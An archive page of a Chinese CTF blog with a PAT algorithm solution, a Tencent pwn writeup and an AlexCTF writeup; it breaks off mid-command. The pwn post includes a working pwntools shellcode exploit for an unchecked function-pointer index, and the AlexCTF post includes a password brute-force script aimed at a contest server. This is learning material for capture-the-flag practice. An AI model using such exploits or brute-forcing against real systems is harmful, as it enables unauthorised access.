<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta name="renderer" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <link rel="dns-prefetch" href="http://reehy.top">
  <title>Ree</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="另一个的隐秘角落">
<meta property="og:type" content="website">
<meta property="og:title" content="Ree">
<meta property="og:url" content="http://reehy.top/page/7/index.html">
<meta property="og:site_name" content="Ree">
<meta property="og:description" content="另一个的隐秘角落">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Ree">
<meta name="twitter:description" content="另一个的隐秘角落">
  
    <link rel="alternative" href="/atom.xml" title="Ree" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" type="text/css" href="/./main.2d7529.css">
  <style type="text/css">
  
    #container.show {
      background: linear-gradient(200deg,#a0cfe4,#e8c37e);
    }
  </style>
  

  

</head>

<body>
  <div id="container" q-class="show:isCtnShow">
    <canvas id="anm-canvas" class="anm-canvas"></canvas>
    <div class="left-col" q-class="show:isShow">
      
<div class="overlay" style="background: #575B5F"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			<img src="/img/me.jpg" class="js-avatar">
		</a>
		<hgroup>
		  <h1 class="header-author"><a href="/">Ree He</a></h1>
		</hgroup>
		
		<p class="header-subtitle">做一些微不足道的贡献。</p>
		

		<nav class="header-menu">
			<ul>
			
				<li><a href="/">主页</a></li>
	        
				<li><a href="/tags/PWN/">PWN</a></li>
	        
				<li><a href="/tags/PAT/">PAT</a></li>
	        
				<li><a href="/2017/02/17/C-STL使用目录/">STL</a></li>
	        
			</ul>
		</nav>
		<nav class="header-smart-menu">
    		
    			
    			<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
    			
            
    			
    			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
    			
            
    			
    			<a q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
    			
            
		</nav>
		<nav class="header-nav">
			<div class="social">
				
					<a class="github" target="_blank" href="https://github.com/heyuanree" title="github"><i class="icon-github"></i></a>
		        
					<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
		        
					<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/ree-96/activities" title="zhihu"><i class="icon-zhihu"></i></a>
		        
					<a class="mail" target="_blank" href="mailto:heyuanree@gmail.com" title="mail"><i class="icon-mail"></i></a>
		        
					<a class="google" target="_blank" href="/heyuanree@gmail.com" title="google"><i class="icon-google"></i></a>
		        
			</div>
		</nav>
	</header>		
</div>

    </div>
    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
      
<nav id="mobile-nav">
  	<div class="overlay js-overlay" style="background: #575B5F"></div>
	<div class="btnctn js-mobile-btnctn">
  		<div class="slider-trigger list" q-on="click: openSlider(e)"><i class="icon icon-sort"></i></div>
	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img src="/img/me.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author js-header-author">Ree He</h1>
			</hgroup>
			
			<p class="header-subtitle"><i class="icon icon-quo-left"></i>做一些微不足道的贡献。<i class="icon icon-quo-right"></i></p>
			
			
			
				
			
				
			
				
			
				
			
			
			
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/heyuanree" title="github"><i class="icon-github"></i></a>
			        
						<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
			        
						<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/ree-96/activities" title="zhihu"><i class="icon-zhihu"></i></a>
			        
						<a class="mail" target="_blank" href="mailto:heyuanree@gmail.com" title="mail"><i class="icon-mail"></i></a>
			        
						<a class="google" target="_blank" href="/heyuanree@gmail.com" title="google"><i class="icon-google"></i></a>
			        
				</div>
			</nav>

			<nav class="header-menu js-header-menu">
				<ul style="width: 70%">
				
				
					<li style="width: 25%"><a href="/">主页</a></li>
		        
					<li style="width: 25%"><a href="/tags/PWN/">PWN</a></li>
		        
					<li style="width: 25%"><a href="/tags/PAT/">PAT</a></li>
		        
					<li style="width: 25%"><a href="/2017/02/17/C-STL使用目录/">STL</a></li>
		        
				</ul>
			</nav>
		</header>				
	</div>
	<div class="mobile-mask" style="display:none" q-show="isShow"></div>
</nav>

      <div id="wrapper" class="body-wrap">
        <div class="menu-l">
          <div class="canvas-wrap">
            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
          </div>
          <div id="js-content" class="content-ll">
            
  
    <article id="post-PAT-advanced-1004" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/08/PAT-advanced-1004/">PAT advanced 1004</a>
    </h1>
  

        
        <a href="/2017/02/08/PAT-advanced-1004/" class="archive-article-date">
  	<time datetime="2017-02-08T08:02:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-08</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p> 1004.Counting Leaves(30)</p>
<p>A family hierarchy is usually presented by a pedigree tree. Your job is to count those family members who have no child.<br>Input</p>
<p>Each input file contains one test case. Each case starts with a line containing 0 &lt; N &lt; 100, the number of nodes in a tree, and M (&lt; N), the number of non-leaf nodes. Then M lines follow, each in the format:</p>
<p>ID K ID[1] ID[2] … ID[K]<br>where ID is a two-digit number representing a given non-leaf node, K is the number of its children, followed by a sequence of two-digit ID’s of its children. For the sake of simplicity, let us fix the root ID to be 01.<br>Output</p>
<p>For each test case, you are supposed to count those family members who have no child for every seniority level starting from the root. The numbers must be printed in a line, separated by a space, and there must be no extra space at the end of each line.</p>
<p>The sample case represents a tree with only 2 nodes, where 01 is the root and 02 is its only child. Hence on the root 01 level, there is 0 leaf node; and on the next level, there is 1 leaf node. Then we should output “0 1” in a line.</p>
<p>Sample Input<br>2 1<br>01 1 02<br>Sample Output<br>0 1</p>
</blockquote>
<p>参考了排行榜里的一位前辈，学习了很多的东西，比如<code>vector</code>真的是一个很方便的东西；又比如<code>std::max(int a ,int b)</code>这个很方便的函数。很多在学数据结构的时候没有好好学习，数据结构还是要补一补。</p>
<p>不过这种不系统的学习方法真的好么？</p>
<p>还是要抽时间好好学一遍的。</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;climits&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxN = <span class="number">1e2</span> + <span class="number">10</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> m;</div><div class="line"><span class="keyword">int</span> ans[maxN];</div><div class="line"><span class="keyword">int</span> deep = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tree[maxN];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> d)</span></span></div><div class="line">&#123;</div><div class="line">	deep = max(deep, d);</div><div class="line">	<span class="keyword">if</span> (!tree[i].size()) ans[d]++;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; tree[i].size(); j++)</div><div class="line">	&#123;</div><div class="line">		dfs(tree[i][j], d + <span class="number">1</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;m);</div><div class="line">	<span class="keyword">while</span> (m--)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">int</span> id, d;</div><div class="line">		<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;id, &amp;d);</div><div class="line">		<span class="keyword">while</span> (d--)</div><div class="line">		&#123;</div><div class="line">			<span class="keyword">int</span> y;</div><div class="line">			<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;y);</div><div class="line">			tree[id].push_back(y);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	dfs(<span class="number">1</span>, <span class="number">0</span>);</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= deep; i++)</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%s%d"</span>, i ? <span class="string">" "</span> : <span class="string">""</span>, ans[i]);</div><div class="line">	system(<span class="string">"pause"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PAT</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/08/PAT-advanced-1004/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-腾讯一道pwn题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/08/腾讯一道pwn题/">腾讯一道pwn题</a>
    </h1>
  

        
        <a href="/2017/02/08/腾讯一道pwn题/" class="archive-article-date">
  	<time datetime="2017-02-07T21:09:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-08</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-14h]@1</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+20h] [bp-10h]@1</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+24h] [bp-Ch]@1</span></div><div class="line">  func v7; <span class="comment">// [sp+28h] [bp-8h]@1</span></div><div class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+2Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Which method would you like to choose?\n1. Add\n2. Subtract\n3. Multiply\n4. Divide"</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  readIntegers(&amp;v6, &amp;v5);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"You chose: %d\n"</span>, v6);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Enter two numbers to do math with, e.g. [123 110]"</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  readIntegers(&amp;v5, &amp;v4);</div><div class="line">  v7 = funcs[v6 - <span class="number">1</span>];</div><div class="line">  v8 = v7(v5, v4);</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Result is : %d\n"</span>, v8);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>选择加减乘除选项，通过一个函数指针数组实现（？不知道函数指针数组是不是就是这么实现的），没有检查偏移，可以控制偏移到我们的shellcode上。shellcode写在全局数组buf里。buf前四个字节写上buf+4的地址，buf+4写shellcode。</p>
<p>程序的保护：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; checksec </div><div class="line">RELRO           <span class="keyword">STACK</span> CANARY      NX            PIE             RPATH      RUNPATH      <span class="keyword">FILE</span></div><div class="line">Partial RELRO   <span class="keyword">No</span> canary found   NX disabled   <span class="keyword">No</span> PIE          <span class="keyword">No</span> RPATH   <span class="keyword">No</span> RUNPATH   /home/ubuntu/workspace/nbw/tc</div></pre></td></tr></table></figure>
<p>都没开，不过好像也没用到。</p>
<p>里面的函数指针数组的实现（暂且这么称呼吧）还是蛮有意思的，贴一下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">24h</span>]</div><div class="line"><span class="keyword">sub</span>     <span class="built_in">eax</span>, <span class="number">1</span>                                            // 刚开始忘了这里减<span class="number">1</span>，坑了很久</div><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, funcs[<span class="built_in">eax</span>*<span class="number">4</span>]                       //取func+<span class="built_in">eax</span>*<span class="number">4</span>的值，将这个值写为buf的地址的偏移  <span class="number">28</span>+<span class="number">1</span></div><div class="line"><span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">28h</span>], <span class="built_in">eax</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">esp</span>+<span class="number">1Ch</span>]</div><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">20h</span>]</div><div class="line"><span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">4</span>], <span class="built_in">edx</span></div><div class="line"><span class="keyword">mov</span>     [<span class="built_in">esp</span>], <span class="built_in">eax</span></div><div class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">28h</span>]</div><div class="line"><span class="keyword">call</span>    <span class="built_in">eax</span></div></pre></td></tr></table></figure>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight pony"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"># <span class="function"><span class="keyword">fun</span>[<span class="title">v6</span> - 1]</span></div><div class="line"></div><div class="line"><span class="title">func_addr</span> = 0<span class="title">x804A030</span></div><div class="line"><span class="title">buf_addr</span> = 0<span class="title">x804A0A0</span></div><div class="line"><span class="title">shellcode</span> = <span class="title">shellcraft</span>.<span class="title">i386</span>.<span class="title">sh</span>()</div><div class="line"><span class="title">shellcode</span> = <span class="title">asm</span>(shellcode)</div><div class="line"></div><div class="line"><span class="title">offset</span> = (buf_addr - func_addr) / 4 + 1</div><div class="line"><span class="title">payload1</span> = <span class="title">str</span>(offset)</div><div class="line"><span class="title">payload2</span> = <span class="title">p32</span>(buf_addr + <span class="number">4</span>)</div><div class="line"><span class="title">payload2</span> += <span class="title">shellcode</span></div><div class="line"></div><div class="line"><span class="title">p</span> = <span class="title">process</span>('./tc')</div><div class="line"><span class="title">p</span>.<span class="title">recvuntil</span>('<span class="type">Divide</span>\n')</div><div class="line"><span class="title">p</span>.<span class="title">sendline</span>(payload1)</div><div class="line"><span class="title">p</span>.<span class="title">recvuntil</span>('<span class="number">110</span>]\n')</div><div class="line"><span class="title">p</span>.<span class="title">sendline</span>(payload2)</div><div class="line"><span class="title">p</span>.<span class="title">interactive</span>()</div></pre></td></tr></table></figure>
      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
        		</li>
      		 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/08/腾讯一道pwn题/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-AlexCTF-writeup" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/07/AlexCTF-writeup/">AlexCTF writeup</a>
    </h1>
  

        
        <a href="/2017/02/07/AlexCTF-writeup/" class="archive-article-date">
  	<time datetime="2017-02-06T17:29:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-07</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>先膜下我们逆向的队友，是真的强，不知道哪位，改天去问问。我就好好学习pwn吧。<br>再吐槽下这个比赛，脑洞奇大= =</p>
<h2 id="Trivia"><a href="#Trivia" class="headerlink" title="Trivia"></a>Trivia</h2><h3 id="TR1-Hello-there"><a href="#TR1-Hello-there" class="headerlink" title="TR1: Hello there"></a>TR1: Hello there</h3><p>认识了一个叫做IRC(Internet Relay Chat)的在线聊天室，使用方法简单，起一个Nickname，在同一个Chanel里即可。<br>顶部就是Flag</p>
<p><code>#alexctf: Alexandria University student held capture the flag event ctf.oddcoder.com ALEXCTF{W3_w15h_y0u_g00d_luck}</code></p>
<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="fore1-hit-the-core"><a href="#fore1-hit-the-core" class="headerlink" title="fore1: hit the core"></a>fore1: hit the core</h3><p><code>strings</code>看一下，发现了一串字符串</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc</span>&#123;<span class="keyword">bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n </span>kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;</div></pre></td></tr></table></figure>
<p>然后大家脑洞清奇的发现了所有的大写字母拼起来就是flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">strings =<span class="string">'''AeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;'''</span></div><div class="line">flag = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(strings)):</div><div class="line">    <span class="keyword">if</span> i % <span class="number">5</span> == <span class="number">0</span>:</div><div class="line">        flag += strings[i]</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
<p>flag<code>ALEXCTF{K33P_7H3_g00D_w0rk_up}</code></p>
<h3 id="fore2-mail-client"><a href="#fore2-mail-client" class="headerlink" title="fore2: mail client"></a>fore2: mail client</h3><p>看了某个答案，是爆破的，当时没想到，但不觉得是一个好方法<br>最终结果是<code>ALEXCTF{Mu77_Th3_CoRe}</code><br>代码：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line"><span class="keyword">f</span> = <span class="keyword">open</span>(<span class="string">'string'</span>, <span class="string">'r'</span>)</div><div class="line">lines = <span class="keyword">f</span>.readlines()</div><div class="line"></div><div class="line"><span class="keyword">for</span> i in <span class="built_in">line</span><span class="variable">s:</span></div><div class="line">    <span class="keyword">p</span> = remote(<span class="string">'195.154.53.62'</span>, <span class="number">2222</span>)</div><div class="line">    <span class="keyword">p</span>.recvuntil(<span class="string">'Email:'</span>)</div><div class="line">    <span class="keyword">p</span>.sendline(<span class="string">'alexctf@example.com'</span>)</div><div class="line">    <span class="keyword">p</span>.recvuntil(<span class="string">'Password:'</span>)</div><div class="line">    <span class="keyword">print</span> i</div><div class="line">    <span class="keyword">p</span>.sendline(i)</div><div class="line">    flag = <span class="keyword">p</span>.recvline()</div><div class="line">    <span class="keyword">if</span> <span class="string">'Invalid'</span> in fla<span class="variable">g:</span></div><div class="line">        <span class="keyword">p</span>.<span class="keyword">close</span>()</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> flag</div><div class="line">        <span class="keyword">p</span>.interactive()</div></pre></td></tr></table></figure>
<p><code>Password: dksgkpdjg;kdj;gkje;gj;dkgv a enpginewognvln owkge  noejne</code>就是strings了core下</p>
<h3 id="fore3-usb-probing"><a href="#fore3-usb-probing" class="headerlink" title="fore3: usb probing"></a>fore3: usb probing</h3><p>usb传了一个png，在最大的数据包里能看到，windows有毒，用浏览器打开png才能正常看到</p>
<p><code>ALEXCTF{SN1FF_T3H_FL4G_OV3R_USB}</code></p>
<h3 id="fore4-unknown-format"><a href="#fore4-unknown-format" class="headerlink" title="fore4: unknown format"></a>fore4: unknown format</h3><p>里面有一个<code>.SP01</code>文件，上网查一下，是kindle的升级包。网上还有一个<code>kindletool</code>的工具，可以从这种包中打包和提取文件。</p>
<p><a href="https://github.com/NiLuJe/KindleTool" target="_blank" rel="external">Kindletool</a></p>
<p>使用过程如下：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">ubuntu<span class="meta">@VM</span><span class="number">-250</span><span class="number">-199</span>-<span class="string">ubuntu:</span><span class="regexp">~/ctf-problem/</span><span class="number">2017</span>alexctf<span class="regexp">/forensics/</span>unknown_format$ ./kindletool dm out flag</div><div class="line">ubuntu<span class="meta">@VM</span><span class="number">-250</span><span class="number">-199</span>-<span class="string">ubuntu:</span><span class="regexp">~/ctf-problem/</span><span class="number">2017</span>alexctf<span class="regexp">/forensics/</span>unknown_format$ file flag</div><div class="line"><span class="string">flag:</span> data</div><div class="line">ubuntu<span class="meta">@VM</span><span class="number">-250</span><span class="number">-199</span>-<span class="string">ubuntu:</span><span class="regexp">~/ctf-problem/</span><span class="number">2017</span>alexctf<span class="regexp">/forensics/</span>unknown_format$ binwalk flag </div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line"><span class="number">254</span>           <span class="number">0xFE</span>            gzip compressed data, from Unix, last <span class="string">modified:</span> <span class="number">2016</span><span class="number">-12</span><span class="number">-31</span> <span class="number">20</span>:<span class="number">20</span>:<span class="number">49</span></div><div class="line"></div><div class="line">ubuntu<span class="meta">@VM</span><span class="number">-250</span><span class="number">-199</span>-<span class="string">ubuntu:</span><span class="regexp">~/ctf-problem/</span><span class="number">2017</span>alexctf<span class="regexp">/forensics/</span>unknown_format$ binwalk -e flag </div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line"><span class="number">254</span>           <span class="number">0xFE</span>            gzip compressed data, from Unix, last <span class="string">modified:</span> <span class="number">2016</span><span class="number">-12</span><span class="number">-31</span> <span class="number">20</span>:<span class="number">20</span>:<span class="number">49</span></div><div class="line"></div><div class="line">ubuntu<span class="meta">@VM</span><span class="number">-250</span><span class="number">-199</span>-<span class="string">ubuntu:</span><span class="regexp">~/ctf-problem/</span><span class="number">2017</span>alexctf<span class="regexp">/forensics/</span>unknown_format$ ls</div><div class="line">flag  _flag.extracted  kindletool  out  usb_sniff.pcap</div><div class="line">ubuntu<span class="meta">@VM</span><span class="number">-250</span><span class="number">-199</span>-<span class="string">ubuntu:</span><span class="regexp">~/ctf-problem/</span><span class="number">2017</span>alexctf<span class="regexp">/forensics/</span>unknown_format$ cd _flag.extracted/ &amp;&amp; ls</div><div class="line">FE  FE.gz</div><div class="line">ubuntu<span class="meta">@VM</span><span class="number">-250</span><span class="number">-199</span>-<span class="string">ubuntu:</span><span class="regexp">~/ctf-problem/</span><span class="number">2017</span>alexctf<span class="regexp">/forensics/</span>unknown_format/_flag.extracted$ tar -zxvf FE.gz</div><div class="line">kindle_out/</div><div class="line">kindle_out/rootfs_md5_list.tar.gz</div><div class="line">kindle_out/<span class="number">2540270001</span><span class="number">-2692310002.</span>ffs</div><div class="line">kindle_out/flag.txt</div><div class="line">kindle_out/update-patches.tar.gz</div><div class="line"><span class="symbol"></span></div><div class="line">gzip: <span class="string">stdin:</span> unexpected end of file</div><div class="line"><span class="string">tar:</span> Unexpected EOF <span class="keyword">in</span> archive</div><div class="line"><span class="string">tar:</span> Unexpected EOF <span class="keyword">in</span> archive</div><div class="line"><span class="string">tar:</span> Error is not <span class="string">recoverable:</span> exiting now</div><div class="line">ubuntu<span class="meta">@VM</span><span class="number">-250</span><span class="number">-199</span>-<span class="string">ubuntu:</span><span class="regexp">~/ctf-problem/</span><span class="number">2017</span>alexctf<span class="regexp">/forensics/</span>unknown_format/_flag.extracted$ ls</div><div class="line">FE  FE.gz  kindle_out</div><div class="line">ubuntu<span class="meta">@VM</span><span class="number">-250</span><span class="number">-199</span>-<span class="string">ubuntu:</span><span class="regexp">~/ctf-problem/</span><span class="number">2017</span>alexctf<span class="regexp">/forensics/</span>unknown_format<span class="regexp">/_flag.extracted$ cd kindle_out/</span></div><div class="line">ubuntu<span class="meta">@VM</span><span 